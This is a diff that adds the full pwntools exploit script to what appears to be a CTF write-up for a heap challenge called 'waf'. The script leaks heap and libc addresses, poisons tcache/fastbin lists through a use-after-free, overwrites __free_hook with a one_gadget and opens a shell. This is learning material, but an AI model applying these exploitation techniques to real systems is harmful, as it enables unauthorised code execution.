@@ -105,6 +105,104 @@ Tcache bins are limited to only 7 chunks, so we can free 7 chunks, then allocate
   then we can just free something, and it will call the `__free_hook`, which is our one_gadget.
   what a fun challenge!
   
+  full exploit: 
+  ```py
+  from pwn import *
+e = ELF('./waf')
+libc = ELF('./libc.so.6')
+#p = remote('challenge.nahamcon.com' , 30535)
+p = e.debug()
+
+idx = 0
+def add(id, size, setting):
+	p.sendline('1')
+	global idx
+	p.recvuntil('config?: ')
+	p.sendline(str(id))
+	p.recvuntil('setting?: ')
+	p.sendline(str(size))
+	p.recvuntil('added?: ')
+	p.sendline((setting))
+	p.recvuntil('[y/n]: ')
+	p.sendline('y')
+	idx+=1
+	return idx-1
+
+def edit(idx, id, size, setting):
+	p.sendline('2')
+	p.recvuntil('edit?: ')
+	p.sendline(str(idx))
+	p.recvuntil('ID?: ')
+	p.sendline(str(id))
+	p.recvuntil('setting?: ')
+	p.sendline(str(size))
+	p.recvuntil('setting?: ')
+	p.sendline(setting)
+	p.recvuntil('[y/n]: ')
+	p.sendline('y')
+
+def print_conf(idx):
+	p.sendline('3')
+	p.recvuntil('print?: ')
+	p.sendline(str(idx))
+	p.recvuntil('ID: ')
+	ID = int(p.recvline()[:-1])
+	p.recvuntil('Setting: ')
+	setting = p.recvline()[:-1]
+	p.recv()
+
+	return ID, setting
+
+def remove():
+	global idx
+	idx-=1
+	p.sendline('4')
+	p.recv()
+def main():
+	add(1, 1, '1')
+	remove()
+	heap = print_conf(0)[0] - 0x280
+
+
+	for i in range(8): #fill tcache, to add chunks to unsorted bins
+		add(1, 0x100, 'a'*8)
+	for i in range(8):
+		remove()
+
+	libc.address = u64(print_conf(idx)[1].ljust(8, b'\x00')) - 0x3ebca0
+
+	print(hex(libc.address))
+
+	#empty out tcache
+	add(1, 0x81, 'b'*10)
+	for i in range(7):
+		add(1, 0x100, 'a'*8) #this will sort one chunk to the smallbin
+
+
+	add(1, 0x50, 'w' * 0x50)  #we get that smal bin chunk
+	
+
+	#trigger write after free, and trick libc to think there is a free list in heap+0xc00
+
+	write_chunk = add(1, 0x50, 'k' * 0x50) 
+	remove()
+
+	edit(write_chunk, heap + 0xc00, 16, 'b' * 16)
+
+
+	#getting two fastbins chunks, one for meta-data and one for content. since the bin is both in the unsorted bin and in the fastbin, we can control fd of unsorteds
+
+	add(1, 0x18, p64(libc.sym.__free_hook)) #fake_chunk->fd->libc.sym.__free_hook
+	add(1, 0x58, 'AAAAAAAA') #remove fake_chunk from tcache
+	add(1, 0x58,p64(libc.address + 0x4f432)) #get fake_chunk->fd, which is libc.sym.__free_hook
+
+	remove() #trigger free
+
+
+	p.interactive()
+
+main()
+```
   
   
   
